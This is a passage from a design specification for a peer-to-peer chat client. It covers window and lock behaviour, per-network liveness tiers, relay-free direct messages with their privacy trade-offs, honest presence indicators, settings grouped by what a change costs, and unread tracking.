no session bus — so the check above catches a hard failure and cannot catch a silent one.
What closes it is that **a second launch raises the windows that already exist**, which makes
relaunching the application a way back that needs no tray at all. So the two doors survive
different failures, which is D37's reasoning about theme reset applied to a different
mechanism: the tray is the ordinary path, and launching it again is the one that works when
the desktop has no tray to put an icon in.

**`05` §1.1 needs amending rather than discarding.** It says closing the window *is* the shutdown
path, and that stops being true here — but everything it required stays required and the
justification gets broader rather than narrower. Durable writes must still be atomic, because a
quit, a crash, an operating system ending the session and a power cut are all still ways a
process stops between a truncate and a fill. What changes is that the ordinary way to stop is now
a deliberate Quit, which is the one case that *can* run a shutdown path: stopping every node and
awaiting it, so claims and relay reservations are released rather than left to expire.

**The way back is per platform, and naming only one of them was a gap.** A tray icon is the
answer on Windows and on the Linux desktops that have a host for one; on macOS the menu bar
extra exists too, but the **Dock icon** is the gesture somebody actually makes, and
`applicationShouldHandleReopen` is how AppKit reports it. Unhandled, that click does nothing,
which is this section's promise failing quietly on one platform — so the shell handles it, and
raises the workspace window only when nothing is showing. There is no equivalent on Windows or
Linux: a taskbar button belongs to a window rather than to an application, so where the last
window is hidden there is nothing to click, and the tray is the whole of the answer there.

### 1.12 The lock reaches every window, and the tray must not leak around it

`02` §6.3 gates the interface on an account and hides the window on lock. With several windows
that becomes two requirements rather than one:

- **The network window is closed, and the workspace window shows the lock screen.** §1.12 said
  *hides all of them* until 2026-09-11, and building it showed that to be a step stronger than
  the requirement and worse to use. The requirement is that nothing a locked installation
  should not show stays on screen — which the network window plainly is, since it is a
  network's messages. The workspace window is not: once it is showing the lock screen it names
  no network and lists nothing. Hiding it too would make the tray the only way back from a
  lock, which is a worse first encounter for no gain. Unlocking therefore arrives where a
  launch arrives, at the list (§1.13), because it is already there.
- **The network window is closed rather than hidden**, and that distinction is the security
  half: a hidden window holds a network's drawn state behind a lock that did not clear it.
- **The tray must show nothing a locked screen would not.** A tray menu listing this
  installation's networks would be a way to read which networks somebody belongs to without
  their password, which is one of the three things §6.3 says the lock protects. So while locked
  the tray offers exactly two things: unlock, and quit.

Neither changes what the lock is worth. §6.3's honest limits stand unaltered — a running node
holds live MLS state and epoch keys in memory by necessity, so this defends against somebody at
the keyboard and not against somebody reading the process.

### 1.13 Launch, and where settings ended up

**Unlocking opens the workspace window and nothing else.** One predictable starting point, and it
is the surface that says what happened while the member was away: unread per network, and
requests waiting for an answer. The cost is one click into a network somebody opens every day,
and it is accepted rather than optimised away — restoring windows automatically would mean the
application deciding what is on screen, and doing it from state that may have gone stale.

**§4.2's settings division survives this and gains an answer it did not have**, which is a good
sign for the rule in §1.1. Its three groups already sort by what a click costs; they now also
sort by window, and the same line does both:

- ***Mine*** — appearance, this device, and the installation-wide storage ceiling (`05` §5.1):
  the **workspace window**, because none of it is about one network.
- ***The network's*** — identity, the network's name, relays, admission, limits, retention,
  permissions: that **network's window**, because every one of them writes an entry that network
  replays.
- ***This machine, here*** — what this machine contributes to one network (`02` §6.4): that
  **network's window** too, since the offer is per network even though the ceiling above it is
  not.

### 1.14 What these windows are not

Naming the line matters, because a window listing everything you belong to is the tempting place
to put everything about them.

The workspace window carries **workspace acts and machine-side facts**: create, join, start a
conversation, leave or forget, set aside, and what is true of a network from *this* machine —
unread, reachability, tier. **Anything that writes a governance entry stays in that network's own
window**, behind §4.2's heading that says what a click costs, because that division is about the
cost of an act and not about where the act is convenient to reach. A network's name, its relays,
its admission mode, its limits and its roles are replayed by every member forever, and none of
them becomes cheaper by being reachable from a list.

§7's eighth question — a governance surface for roles, membership, moderation and the waiting
room — is untouched and stays open. This section makes it *more* answerable by saying plainly
which window it would live in when somebody designs it: the network's.

---

## 2. Liveness: Hot, Warm and Cold

Not every network needs a live node at every moment. Three tiers, chosen per network:

| Tier | What is held | Wake latency | For |
|---|---|---|---|
| **Hot** | Connection open, gossip subscribed | Instant | The network in view |
| **Warm** | A relay *reservation*, no connection | One dial — sub-second | Direct messages, recent networks |
| **Cold** | Nothing | The poll interval | Everything else |

**Warm is the interesting one, and it rests on a distinction Core §5.3 already draws.**
Reservations and circuits are metered separately, and only the first is long-lived: a relay
caps concurrent circuits and holds each to **60 seconds and 256 KB**, because a relay's job
is connection *establishment* and not transport. A reservation has no such ceiling — it is
renewed indefinitely and costs the relay a table entry.

*The figures were 120 seconds and 8 MB when this was written, and §5.3 lowered them on
2026-08-22 so that a relay enforces §5.2 itself rather than trusting clients to. Nothing in
this section turns on the size: it is the separation that matters, and the smaller ceiling
makes the point harder rather than weaker.*

A held connection is not what is needed. What is needed is to be **dialable**, and that is
what a reservation is: long-lived, renewed periodically, cheap. The sender dials when it has
something to send.

**The dial is the wake signal.** An incoming stream wakes the handler, so there is no
"I am about to transmit" message to design, no extra round trip, and no new protocol. This
was very nearly specified as a custom wake-up ping; it is written down here as *not needed*
so the idea does not return.

**Keep-alive, where a connection genuinely is held** (direct or hole-punched pairs, which
have no 120-second ceiling): 2–5 minutes while the application is focused, 2 minutes flat
when it is backgrounded. `IDLE_CONNECTION_TIMEOUT` is currently 60 seconds and exists for a
DCUtR reason, so holding a connection past it needs traffic or a raised timeout on that path
specifically — not a global change.

**Cold poll interval is a user setting, defaulting to 10 minutes.** It never applies to
direct messages, which are warm whenever the application is running.

**What this cost, and the half of it that is now fixed.** `MemberBehaviour` used to be a
fixed struct: every node ran Kademlia, mDNS, identify, ping, relay client, DCUtR and every
request-response protocol. Thirty nodes meant thirty Kademlia routing tables running periodic
bootstrap queries and thirty swarms doing mDNS multicast on the LAN. The observation that
fixes it is that **a direct-message network has exactly two members and needs neither Kademlia
nor mDNS** — there is nobody to discover.

That half is done: **Core §5.1.1** makes discovery optional and `MemberNode::with_discovery`
builds a node without it (`06` §12), keeping everything else — such a node still listens,
dials, is dialable, relays, hole-punches, gossips and serves every request-response protocol.
One constraint comes with it: without a routing table there is no address book either, so a
discovery-less node dials **by address**. A conversation network has that address already, by
the same route it has the membership.

**The tiers above are this client's policy and are deliberately not in the protocol.** Whether
a node exists at this moment, and whether it holds a reservation while nothing is happening,
is a decision made over time by whoever is holding the nodes — a specification has no view on
it and needs none. What the protocol owes is the primitives, and reservations, dialability and
now the leaner behaviour set are all of them. So hot, warm and cold belong here — which is
where this section used to say they were *built*, and only half of that is true.

**The liveness tiers are built, 2026-09-10** — `kols_node::nodes`. The client runs a node per
network rather than one for whichever is in view, which is what `05` §4 always described and what
the shell had never done: it held one handle, and switching networks dropped the task for the one
being left. That is right for servers and makes direct messages *impossible* rather than slow — a
conversation is a network neither party is usually looking at, so a node that runs only while its
network is on screen can neither receive a message nor be reached to deliver one.

**Everything a member has joined is warm unless they say otherwise**, and that is the decision
taken over two narrower policies. The narrow readings save resources by keeping most networks
cold, and what they actually do is make a network **silently unreachable**: somebody in a dozen
networks would be receiving in one of them, with nothing on screen saying that was why the rest
were quiet. Resource use is the member's to manage, which is the answer `02` §6.4 already gives
for storage and bandwidth — a tier is the same choice applied to whether a node runs.

**Cold is polled, not switched off**, and the table above always said so: its wake latency is
*the poll interval*, a member setting defaulting to ten minutes. The first implementation of this
section read cold as "no node, ever", which is a different thing and worse in a way that reaches
other people — a network with no node running serves nothing, so a machine that had taken replica
duty there stops holding up its end of `05` §5.1 for everybody else in it, without anybody being
told. A cold network is slower, not silent.

**Hot and warm are both continuously running nodes**, which is worth saying because "warm" sounds
cheaper than it is. The distinction this section drew was against a held *connection*, not against
a process: what a warm network needs is to be dialable, so the dial is the wake signal, and being
dialable is what a reservation provides. So the saving is connections and gossip meshes rather
than nodes, and a member in a dozen networks runs a dozen-odd of them exactly as `05` §4 says.

**A conversation needs no case of its own any more, which settles a disagreement.** This section
says a conversation is warm whenever the application runs; `05` §4 says idle conversations
"should be suspended and woken on demand rather than all held live" and flags that the threshold
wants measurement. Defaulting everything to warm satisfies the first without having to settle the
second, and a member who wants a conversation quiet sets it aside exactly as they would a server.

**§7's fourth question is answered by asking rather than by inferring.** It asks what "recent"
means for warm membership. It means nothing now: warm is the default and *set aside* is an
explicit per-network choice, so there is no recency heuristic to tune and no set the client has
guessed at. Explicit beats inferred here for the same reason it does in `02` §6.4.

**The behaviour set is built, 2026-09-08.** A node reads its
network's profile from replayed policy and is constructed `Discovery::Off` for a conversation
and `Discovery::Full` for a server. Whether a node exists at this moment and whether it holds a
reservation while nothing is happening — the hot/warm/cold table above — is still unwritten
policy, and the distinction matters because the two are different axes: one is what a node *is*,
fixed at construction (Core §5.1.1), and the other is what it is *doing*, decided over and over.

**A conversation can now be created, which is the half that had to come first.** `kols init`
writes no profile and should not — absent means `server` (spec 07 §1.2), so writing today's
default would freeze a network at it. A conversation is the asymmetric case: readers have to
*refuse* channel entries in one and absent would permit them, so it declares itself, and
`Workspace::create_conversation` is the one path that makes one. There is deliberately no
terminal command for it — a conversation is created by the direct-message flow and by nothing
else, so a surface for making one by hand would be a surface for an act with no meaning outside
that flow.

**The node reports what it was built as rather than what was asked for**, which is a smaller
point than it sounds and was learned twice in one sitting. `MemberNode::discovery()` reads the
behaviour set that exists; a line derived from the caller's own argument is a claim about the
caller, and it prints just as happily when construction ignored it.

**One window stays open, and it is E10's to close.** A joiner builds its node before it can know
the profile: an invite carries only connection bootstrap (Core §5.7), and the profile lives in a
log it has not synced yet — so a store with no log replays to nothing, reads as `server`, and
gets discovery. That is the right direction for a server and is the wrong one for a conversation,
whose first moments would then be spent in a routing table. It costs nothing today, because
nothing can join a conversation until the DM flow exists; the flow that accepts a DM request
knows exactly what it accepted, so **E10 must supply the profile to the join path** rather than
letting it be inferred. Written down here as a requirement of that work rather than left to be
discovered during it.

---

## 3. Direct Messages Must Not Require Setting Up a Relay

Two people starting a conversation cannot be asked to stand up infrastructure first. That
friction would make the feature unusable, and the design has to answer it rather than assume
somebody will.

**The shared network is already the rendezvous.** `03` §4.3 delivers the DM invite over a
direct peer-to-peer stream *inside* the shared network, carrying a voluntary identity link —
a signed common-ownership proof (Core §1.2). So by the time a DM network exists, each party
already knows which identity in the shared network the other one is.

**Therefore: bootstrap the DM connection over the shared-network connection.** The two
parties exchange their DM-network addresses across the connection they already have, then
coordinate a simultaneous open. Nothing new leaks — Bob already knows Alice's IP from the
shared network, and the identity link already told him who she is.

**The rejected alternative, and why.** Having a shared-network node *relay* DM traffic works
and is worse: it tells a third party which two DM identities are talking. Address exchange
tells nobody anything they did not already know. Relaying is the fallback, not the mechanism.

**The gate this needs, without which it is a disaster.** Address disclosure for network X
over network Y is permitted **only to a peer who is a member of X**, checked by replaying
X's governance log. Ungated, this is a "list your other identities' addresses" oracle and
unlinkability is gone wholesale. For a DM the check is trivially tight, since X has exactly
two members.

**When hole-punching fails** (symmetric NAT, CGNAT over IPv4): the DM does not connect.
Core §5.2 was corrected on 2026-08-22 and now says this plainly — there is no third tier, a
relayed circuit carries the DCUtR negotiation and nothing else, and a pair that cannot punch
reaches each other over IPv6 or not at all.

**This removes what used to be written here as the fallback**, and it is worth keeping the
correction visible: the shared network's bootstrap relay was going to serve the circuit, on
the reasoning that it "carries bytes and never inspects a join at all". It does carry bytes
— for a negotiation — and that is the whole of what it may carry. A DM riding a bootstrap
relay is exactly the thing §5.2 now refuses.

What survives is better rather than worse. The relay is still the **rendezvous** that lets two
NATed members negotiate a punch, which is the friction goal and needs no protocol change or
setup by either participant. And the privacy flag that used to sit here is gone with the
fallback: a relay that carries only a negotiation observes that two identities met, for as long
as a handshake takes, rather than watching a conversation. The §1 honest limit on IP correlation
still applies to the rendezvous itself.

Note the precision that still holds: *member* relays meter per-identity against replayed state
and would refuse an identity they cannot verify, so they are not the rendezvous either.

**A relay is never shared between two of a member's networks (D29), and that is a different
statement from the one below.** Reuse is technically possible — a bootstrap relay checks no
membership by design (Core §5.5: it replays no log and holds no capabilities), so it will serve
anyone who dials it. It is refused anyway: `kad` runs under libp2p's default protocol name and
`PROTOCOL_VERSION` is one string for every network, so two networks on one relay share a routing
table and their members become mutually discoverable. Two of one person's identities meeting
there is exactly the correlation Core §1.2 exists to prevent, and §1's honest limit — "any relay
that sees both" — would stop being incidental and become the normal case.

**Not enforced, and deliberately not going to be.** Nothing stops a founder designating one
address in two networks. The relay cannot refuse, having no way to know; enforcing it properly
means network-scoping the protocol names, which is a wire change rather than a client fix.

**The client warns and never refuses — decided 2026-09-07**, revising an earlier draft of this
paragraph that had it refusing. Two reasons the refusal was wrong. It is unenforceable anyway,
so it would stop the honest case and not the determined one, which is the shape of a check that
buys nothing. And it would block a legitimate configuration: a member relaying on their own LAN
for two of their own networks, where the private hop is the only way in for both. A rule that
cannot be enforced and blocks a real use is worse than the limit it was guarding against.

What the client owes instead is the notice, because **it holds the workspace (§1) and is the
only party in a position to notice at all** — the relay cannot see it, and the other network's
members certainly cannot. At the point of designation: *another of your networks already uses
this relay; members of both may become discoverable to each other.* Then it does as it is told.
Saying nothing was the third option and is the worst of the three: the one party who can see
the thing, choosing not to mention it.

**Built 2026-09-08, and three things it settled are worth keeping.**

**A relay is compared by peer id, never by address**, and this is the whole of whether the check
works. One relay answers at several addresses — a DNS name and a bare IPv4, TCP beside QUIC —
so comparing the strings reports *no overlap* in exactly the case D29 is about, and reports it
silently. The peer id is what a relay is: Core §5.4 already asks a relay to publish its own out
of band precisely so a client can tell which one it is talking to. Where an address names two
peers, as a circuit address does, the first is the hop being dialled and so the one that counts.

**There are two designations, not one**, and the second is the more common. The relay panel is
the obvious one; creating a network with a relay is the other, and it is the *first* relay most
people ever designate. A warning that covered only the panel would have missed the case it is
most likely to be needed for. Which network is excluded from the comparison differs between the
two — the open one, or nothing at all, since a network being created has no id yet — and that is
decided by the shell rather than named by the webview, for §5's reason: a front end that chose
what to exclude could hide the warning by choosing wrong.

**The comparison reads each network's cached relay list rather than replaying its log.** The
cache is what this installation actually knows (Core §5.5's third carrier), and replaying
another network's governance log would answer a question about a network when the question is
about a disk — one this member may not have synced.

**What it deliberately does not cover: joining.** A joiner adopts whatever relay the invite
carried, and two invites into two networks may name one relay without the joiner choosing
anything — so the overlap is real and the moment is not a designation. Warning there is a
separate question about a different act, and it is not answered here.

**None of that forbids the bootstrap above, and the distinction is the interesting part.** What
D29 refuses is a relay *designated by two networks*, carrying both as standing infrastructure.
The mechanism in this section is not that: it exchanges the DM network's addresses over a
connection that already exists between two people who have already identified themselves to each
other, and then opens a direct connection. **No relay is involved at all on the primary path**,
and nothing is disclosed that either party did not already hold.

**The fallback is where it gets subtle, and it is bounded rather than free.** When hole-punching
fails and the shared network's bootstrap relay carries the circuit, that relay does briefly serve
two networks. Two things bound it. A conversation-profile network runs `Discovery::Off` (§2), so
it has no routing table and joins nobody else's — the structural half of D29's problem, mutual
discoverability through a shared DHT, cannot arise. And the peer ids it sees are the DM network's,
which are unlinkable by key from the shared network's.

What remains is IP correlation, and it is real: the relay's operator sees one address holding a
reservation as a member of the shared network and as a party to a conversation, and can infer that
two of its members are talking. **That weakens a claim `03` §4.2 makes** — that a separate network
reveals nothing about the conversation to the server — against exactly one party, in exactly the
case where hole-punching failed. Worth keeping the fallback for, since the alternative is that
symmetric-NAT users have no direct messages at all, and worth stating rather than leaving inside
the earlier flag.

**Built 2026-09-10, and it had been a decision with nothing calling it.** `borrowable_relay`
existed from the day D39 landed and no code path invoked it, so a conversation's node
reserved no circuit and had no address to be reached at — which is the first thing the
direct-message flow needs, since an invite must carry one. The loan is now recomputed at
every start and **never cached**: every other relay path in this client writes what it
learned into the store so a node can dial before it has synced, and this one deliberately
does not, because a cached loan would outlive the membership that justified it and nothing
would ask again.

**The relay is borrowed rather than designated, decided 2026-09-10 — D39.** This section
described the fallback without saying what it does to the conversation's own policy, and the
obvious reading is the wrong one. A conversation must **not** write the shared network's relay
into its `bootstrap_relays`: that is replayed state, it outlives the membership that justified
it, and **nothing can remove it** — no member of a two-person conversation can know that the
other two left some third network. So the relay is borrowed at the moment rendezvous is needed,
on a permission recomputed every time, and the rule is that *both* parties are still members of
the shared network. Borrowing on one's own membership alone would let a departed member keep
using their old network's infrastructure to reach somebody still in it.

**What that costs is the feature's stated limit rather than a shortfall**: a conversation between
two people who no longer share a network, and who cannot reach each other directly, stops
working. Old messages stay readable — they are content on both machines — but nothing new
crosses. The interface owes that sentence where a conversation goes quiet, because a DM that has
silently stopped connecting and one where nobody is talking render identically, and only the
first is worth knowing about.

**One dependency follows, and it is easy to miss: `Discovery::Off` for conversation networks stops
being a resource optimisation and becomes a privacy requirement.** It is what keeps the fallback
from putting a DM node into the shared relay's routing table. `06` §12 filed it as an efficiency
measure and it is load-bearing for this — **built 2026-09-08**, a node reading its profile from
replayed policy and being constructed accordingly.

**The same correlation is reachable with no relay involved at all, and this client refuses it
there too.** A node that dialled the peers mDNS finds would put two of a member's identities on
one local network at one moment, which is the inference D29 exists to deny a shared relay, handed
instead to anyone watching that LAN. So **this client does not dial what mDNS finds** — a
decision rather than a gap, and the reason a member's two networks stay unlinkable in a house as
well as on the wire. `00` §6 owns the decision and states what it costs: two members of one
network sitting in the same room still need a routable third party to meet. Note the scope, since
it reads wider than it is — LAN only, no bearing on members in different houses, and nothing to
do with whether content routes.

**Scope, recorded because it bounds what relay work is ever worth doing: there are no shared
relays and none are planned.** A relay here is a member of the network it serves, volunteered
under Core §4.3's opt-in, and the project does not intend to build third-party or pooled
relaying at any point. That is why the friction question above matters so much — with no pool
to fall back on, "two people cannot be asked to stand up infrastructure to talk" has to be
answered by the design rather than by an operator, and §3 is that answer.

---

## 4. Information Architecture

Discord's *information*, not its layout. Four questions the interface must answer at a
glance:

1. **Which network am I in?**
2. **What channels does it have, and which am I reading?**
3. **Who is on it, and are they around?**
4. **What can I do here that I could not do somewhere else?** — §5.

The first two are local state off governance replay and cost nothing.

### 4.1 Presence, and Not Lying About It

`01` §9 already specifies the mechanism: an ephemeral gossip topic, 30-second heartbeats,
coarse states `here | idle | busy | invisible`, with the beats never stored and dropped on
restart. `invisible` is a real setting rather than a courtesy, because presence here is visible to
every member of a network. At scale it is subscribed **per channel in view** rather than
network-wide.

*This paragraph said `online | idle | dnd | invisible` until 2026-09-10, which is the
vocabulary `01` §9 carried before presence was built and this section's own rule below
forbids: `online` is the word that cannot be justified for the absence case and is no better
for the present one, since there is no server to be on a line to. `busy` replaced `dnd` for
the same reason a name should say what it means. Worth noting how it survived — the rest of
§4.1 was rewritten around what building it settled, and its first paragraph was left quoting
the specification it had just corrected, four lines above the rule it broke.*

**What the interface must get right is the absence case.** With no server, "offline" and
"I have not heard from them" are the same observation. Discord can assert offline
authoritatively because every client is connected to it; we cannot, because a member may be
perfectly online and simply not reachable from here.

So the roster distinguishes **heard recently** from **no signal**, and never claims a member
is offline. The wording carries more weight than the colour of the dot: an interface that
renders "Offline" is stating something it does not know.

**Built 2026-09-08, and the ordering it waited for was the point.** The mechanism had to exist
before the dot did, because a dot drawn without it would be reporting reachability from this
node and calling it presence — precisely the claim the paragraph above forbids. It is last in
this section because it was last in the work.

**Two marks, because there are two facts and neither may stand in for the other.**

- The **ring** is this node's own observation: a connection to that member right now. It is
  drawn as an empty ring rather than an unlit light, so its absence reads as *no information*
  rather than as a red light saying somebody is away.
- The **word** beside a name is what that member said about themselves, and it appears only
  while their beat is still current. It travels by gossip, so somebody can be *here* without
  this node holding a connection to them, and that difference is exactly why the two marks
  cannot be merged.

**No word at all is the absence case, and it is deliberately silent.** It covers a beat gone
stale, a member who chose to be invisible, and a member this node has never heard from — three
different situations that nothing here distinguishes, so the row says nothing rather than
inventing a word that would collapse them. There is no *offline* in this vocabulary: not in the
interface, not in the boundary's event, not in the wire format. A word that cannot be justified
is better absent than unused, because an unused one gets reached for.

**Invisible publishes nothing rather than publishing "invisible".** A beat saying so would tell
every member that this node is running and hiding, which is most of what the setting withholds
— so a member who chooses it is indistinguishable from one whose machine is off, which is the
only implementation that means what it says. The window states that where the choice is made,
because the failure worth preventing is somebody believing they are hidden while a beat goes
out. It is the one setting whose correctness a member cannot check for themselves.

**And it is the one presence state that survives a restart**, which is the exception to the
first paragraph's *dropped on restart* rather than a contradiction of it: the beats are
ephemeral, the *choice* is not. A member who chose to be hidden and then closed the
application must not reappear on the roster because their node came back, since that is
precisely the moment they are not there to notice.

**Freshness is judged by when this node heard, never by the time the beat carries.** Clocks
disagree, and the timestamp is signed by the sender — so a member whose clock reads next year
could otherwise pin themselves as present forever with one message.

**The control lives in the roster rather than in settings**, which is an exception to §4.2's
grouping and has a reason: presence is local and other members see it, so by that section's own
rule it belongs under *this machine, here*. But settings is a place you go to finish something
and leave, and this is changed in the moment — and the moment is when you are already looking at
who is around.

**Where it lives, and the one number that stays on screen.** The roster is a dropdown at the
top right rather than a permanent column, and what remains visible is a count of the members
this node holds a connection to, beside a dot for yourself that is lit when that count is not
zero.

That dot is not presence either, and it is worth being exact about which narrower thing it
is: it says **this node is talking to somebody**. Nothing else in the window answers that.
"The network is quiet" and "nothing I write leaves this machine" render identically —
an empty channel, a roster of unlit rings — and the second is the one worth knowing about
immediately. Previously it could be reached only by opening the roster and counting rows that
were not lit, which is a question nobody thinks to ask until after the evening is wasted.

The count is deliberately of *other* members, so it is zero on a network where you are the
only one, rather than one. A roster that congratulated somebody on being connected to
themselves would be the same class of mistake as claiming a member is offline.

### 4.2 Settings, and the Line Down the Middle of It

Settings is one screen with sections, and the sections are arranged around a distinction this
application cares about more than most: **some of what lives here is mine, and some of it is
the network's.**

**A screen and not a layer over one**, which is a correction rather than a preference. It used
to float over a dimmed channel, and a veil makes a claim: *this is a detour, the real thing is
underneath*. Half of what is in here writes governance entries every member replays and nobody
can unwrite, and the paragraphs below explain that at length — read through a dim wash, in a
column narrower than the window already available. The sheet was arguing against its own
contents. Settings is a place you go, so it takes the window and gives it back; `done` and
Escape both leave, because a full-window view with one way out is the trap a sheet at least
never was.

The rule that decides which surface a thing gets is whether somebody came to **finish
something and leave**. Minting an invite is that, and is a sheet. Choosing what this network
keeps forever is not.

Changing a font is local, private and undoable. Changing the network's name writes a
governance entry that every member replays and nobody can unwrite — it is the same act as
renaming a channel, arriving through a quieter door. A sheet that mixed the two would teach
people that everything in it is a preference, which is wrong about half of it. So the grouping
is by *what a click costs*, not by topic:

**Built**, as a nav of two headed groups beside a panel. The headings carry the distinction
rather than merely labelling it: each says what a change on that side *costs*, because
without that they are two words and the line between them is the whole point.

**Mine — local, private, never broadcast, undoable.**

- **Appearance** — the theme (§6): background, fonts, sizes, colours. Import, switch, and the
  reset D37 requires. **The panel exists and the feature does not**, and it says which: §6.5
  makes reset-without-the-theme's-cooperation a precondition of shipping theming at all, so
  the section describes what is coming and why the order is that way round rather than
  offering a control that would be a reassurance instead of a reset.
- **This device** — anything nothing else needs to know. Empty today, and named so that the
  first local preference has somewhere obvious to land instead of being filed under the
  network's business.

**The network's — signed, replayed by every joiner, permanent.**

- **Identity** — the display name this member claims. Filed here rather than beside appearance
  precisely because it *feels* local and is not: D27 makes a name a governance-log claim, and
  a member who thought it was a preference would be surprised by the one property that matters,
  which is that it is never released.
- **Network** — its name (D32), its bootstrap relays, how joiners are admitted, and the
  limits and retention windows spec 07 §4.3 and §2.8 carry. Gated on `define-policy` per §5,
  so for most members these controls are absent rather than disabled.

  **Three things this section has to say rather than merely show**, each because the number
  on screen does not carry it:

  - **A limit is a validity rule, not a preference.** A record past one is refused by every
    reader, so these are the network's rather than a member's — and they spend other people's
    disks, which is why they sit with whoever is accountable for the network rather than with
    whoever is uploading.
  - **Zero does not mean one thing.** A rate ceiling of zero is *no limit*; a retention window
    of zero is *forever*; a size of zero is a real bound of zero. Opposite readings of the same
    number, so the interface names the consequence before writing it rather than after.
  - **Retention is not deletion**, and is grouped apart from the limits for that reason:
    nothing is ever refused for exceeding it. Past the window content stops being re-wrapped
    and goes dark to anyone who did not already hold it, while a member who already fetched it
    keeps it permanently. Both windows ship as forever, because content allowed to go dark
    cannot be brought back.

  **A setting the network has not touched is marked as riding the default**, rather than
  rendered identically to one set to the same number. The two behave differently — only the
  first picks up a revised default — and nothing else on screen distinguishes them.

  **Auto-admit is disabled rather than hidden on a member-vote network**, with the reason
  beside it. Core §2.6 refuses that pairing, and hiding the option would leave somebody
  hunting for a setting the client had silently decided not to offer.
- **Permissions** — roles and what they hold.

**Permissions is here provisionally, and the reason is worth writing down.** It is not a
setting. It is network governance, and it belongs with membership, moderation and the waiting
room in a surface that does not exist yet. It sits in this sheet because that surface does not
exist, not because this is where it goes — §7 carries the question, and an item parked in the
wrong room should say so rather than settle in.

**It is built, and it is role-first, because the protocol leaves no other honest shape.**
Capabilities are held by groups and never by individuals (`02` §1), so a person-first surface
would be a lie about what the log can express — there is no per-user grant to render. A role
is chosen, and its members and its grants sit beside each other, each grant naming a verb and
the scope it binds at. Three things the surface has to get right, all of them consequences
rather than choices:

- **Scope is offered categories-first**, because `02` §4 makes the category the scope a grant
  is expected to bind at and the channel the override. Ordering the picker is the cheapest
  place to say so.
- **A governance-tier verb is marked, and is not offered for `everyone` at all.** Core §2.4
  hardcodes that ceiling, so the two verbs that would violate it are absent from that role's
  picker — shown as a property of the vocabulary rather than discovered as a refusal.
  Withdrawing one is still offered, since refusing both directions would make a network that
  somehow held such a grant unable to repair itself.
- **The one-person case is three steps, and the surface says so rather than pretending
  otherwise.** `02` §1 asks for a first-class "give access to…" action that makes and manages
  a single-member group behind the scenes; that is not built, and the panel describes the
  three steps instead of claiming a shortcut it does not have. Worth building — it is the
  case people will reach for most — and worth not lying about meanwhile.
- **Capabilities the chat vocabulary does not define are listed and not edited.**
  `approve-node`, `publish:chat-log` and the rest are the network's own governance, and a grid
  built for chat verbs would present them as the same kind of thing. Listing them is still
  necessary: a role whose powers were half displayed reads as weaker than it is.

**A third group exists, and pretending otherwise was the alternative.** *Contribution* — how
much disk this network may use on this machine (`02` §6.4) — is local, revocable and needs no
capability, which sounds like *mine*; and the heading over *mine* says **never broadcast**,
which it is not. Every member reads what this node offers, because it is a signed ledger
advertisement placement weights. So it sits under its own heading, **this machine, here**,
noted as *local and revocable, and other members read it*.

Filing it under *mine* would have made that heading false for one of its own items, which is
worse than adding a heading: the whole point of the division is that a member can trust what
the headings say about what a click costs.

**A panel that describes an unbuilt mechanism has to be revisited when it is built**, and this
one was not. It told members storage was "an offer rather than a ceiling" and that the node
"takes on no storage duty for others yet" — true when written, false a day later, and left
standing while the cap it denied was enforcing itself on their disk. A claim about what the
software does is the one kind of copy that rots, and the fix is a guard rather than diligence:
`drive.mjs` now reads the live panel and fails if it says the cap is unenforced.

**These three groups now also say which window** (§1.13), and the same line does both jobs:
*mine* and the installation-wide ceiling are the workspace window's, and everything belonging
to one network — including what this machine contributes to it — is that network's. A division
by what a click costs turning out to also divide by window is a sign the rule underneath it is
the right one.

**What may join later** is bounded by the same reading. Anything whose change is local and
private goes under *mine*; anything local that other members can see goes under *this machine,
here*; anything that writes to the log goes under *the network's*; and anything that does none
of those is not a setting and wants a different home.

### 4.3 What Arrived, and What You Have Not Seen

Two different questions, answered separately because they fail separately.

**Where something arrived** is the unread count on a channel: weight on the name so it reads
at a glance, and a number once you look. Driven by arrival rather than by scanning — the node
reports what it learned and a channel nobody is looking at gains a count — which is what makes
it free and what makes it survive the application being closed, since the node was not running
either and learns the backlog on the next start.

**What you have not read** is a mark on the individual message, and it cannot be derived from
the first. **A message is ordered by its author's clock, not by its arrival**, so one written
five minutes ago by somebody whose node was offline lands five minutes back in the timeline
when it finally reaches you — behind any watermark you could have set. A read position would
file it as already seen every time, and this is precisely the message that needs pointing at.

So what is remembered is *which* messages were on screen the last time somebody looked at the
channel, per person per machine, and everything else in it is new. That is bounded by the size
of the channel rather than growing, and it is replaced on each visit rather than accumulated —
everything is drawn, so "what was here last time" is the complete answer and there is no
eviction policy to get wrong.

Three properties it commits to:

- **First sight of a channel marks nothing.** No record at all means this machine has never
  displayed it, and the honest reading of that is *no idea* rather than *none of this has been
  seen* — which would set a hundred messages of backlog alight on the day somebody joins.
  From the second visit it is exact.
- **Marks accumulate while you stay and clear when you arrive.** A redraw under a reader who
  has not moved must not erase them, or the second message would clear the mark on the first.
  Clicking the channel — including the one you are already in, which is the only gesture
  available on a network with one channel — is what starts them again.
- **Never your own.** You were there when it was written, and a mark saying *you have not seen
  this* over something somebody just typed is the interface disagreeing with the person using
  it.
- **A mark is a nudge and expires like one.** It clears when the eye reaches it — hovering the
  message — and otherwise fifteen seconds after the window becomes the focused one. Focus is
  the trigger rather than arrival, because marks earned while somebody was away are exactly
  the ones worth keeping until they are back to see them; and the timer is not restarted by a
  redraw, or a busy channel would never settle, which is the case where the marks are worth
  least. Left standing, a mark stops being a signal and becomes state to be dismissed.
- **It is local, and says so.** What somebody has read is not a fact about the network, and
  writing it to the log would publish a reading habit to every member. §7.7 is what to revisit:
  read state becomes shared when multi-device lands, and this is per device until it does.

**Outside the window there are two signals and deliberately no third.** §1.3 extends both to
several windows — a network window's title carries its own network and never a cross-network
total, since D36 made that title the one piece of chrome saying where you are. Within one
window, which is what this section is about: the title carries the
total, because it is the only one still true a minute later and the only one a taskbar shows;
an attention request fires while the window is unfocused, because it is the only one that
arrives while somebody is doing something else. No sound, and no operating-system toast — a
toast means a plugin and a permission this client has never asked for, and that is a decision
to make on purpose rather than one to slip in beside a title change. §7.3 is the larger
question this answers only within one network.

### 4.4 Reaching Back

Opening a channel reads every record in it. That is 20 ms at five hundred and about four
seconds at a hundred thousand (`05` §5), on a control the window re-runs every two seconds —
so the cost is not paid once when somebody arrives, it is paid continuously for as long as
they stay. `01` §5 has always said a UI bounds this by pages. This is what that means.

**The mechanism is built and was deliberately left switched off** (`05` §5): the index, the
stored rate verdict and the page read all exist and are proved against `kols_core::withheld`
itself. What was missing is this section. Rendering a page into an interface that cannot ask
for the next one hides history with no way to reach it, which is a worse failure than the
slowness it fixes.

#### There are two kinds of *older* and they must never be one control

